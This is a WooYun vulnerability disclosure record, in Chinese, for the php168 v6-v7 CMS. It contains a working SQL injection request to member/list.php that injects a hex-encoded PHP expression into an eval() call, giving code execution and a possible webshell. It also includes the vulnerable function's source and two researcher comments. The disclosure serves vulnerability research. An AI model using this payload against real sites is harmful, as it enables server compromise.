{"id": 17512, "wybug_id": "wooyun-2012-012369", "wybug_title": "php168 v6~v7鸡肋Getshell安全问题", "wybug_corp": "php168", "wybug_author": "网络达人", "wybug_date": "2012-09-18 20:55", "wybug_open_date": "2012-09-18 20:55", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-09-18：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-09-18：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： php168 v6~v7 部分脚本过滤不导致可以获取WEBSHELL 详细说明：  有点鸡肋，需要条件：1.网站配置为：文章生成真静态2.允许注册会员给出v6的测试代码，提交后执行phpinfo()，v7原理一样，只是数据库字段数不一样。\nmember/list.php?step=2&Type=delete&aidDB[]=-1)%20union%20select%201,2,3,4,5,6,7,8,9,10,1,2,3,4,15,6,7,8,9,10,1,2,3,4,25,6,7,8,9,10,1,2,3,4,35,6,7,8,9,10,1,2,3,4,45,6,7,8,9,10,1,2,3,4,0x7B247B706870696E666F28297D7D,6,7%23\n漏洞在make_more_article_html这个函数：\nfunction make_more_article_html($comebackurl='/',$type='',$aidDB=''){global $db,$pre,$webdb,$webdb,$showHtml_Type;if($webdb[NewsMakeHtml]!=1||$aidDB=='')  // $webdb[NewsMakeHtml] 真静态{ return ;}...$query = $db->query(\"SELECT A.*,B.bencandy_html,B.list_html,D.aid FROM {$pre}article_db D LEFT JOIN  {$pre}article A ON D.aid=A.aid LEFT JOIN {$pre}sort B ON A.fid=B.fid WHERE D.aid IN ($string)\");while($rs = $db->fetch_array($query)){...$filename_b=$rs[bencandy_html];...eval(\"\\$showurl=\\\"$filename_b\\\";\");...\n 在 \\member\\list.php中调用了该漏洞函数：\nif($step==2){...if($Type=='delete'){  make_more_article_html(\"$FROMURL\",\"del_0\",$aidDB);\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 网络达人@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2012-09-18 21:36 |    \t\tXhm1n9 \t\t\t( 实习白帽子  |\t\t\t        Rank:57 漏洞数:13        | bug)\t\t \n  多表查询也能用union了?    \n     2012-09-19 09:43 |    \t\t小雨 \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:19        | phper)\t\t \n  @Xhm1n9 只要列数能匹配上就可以吧。。。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}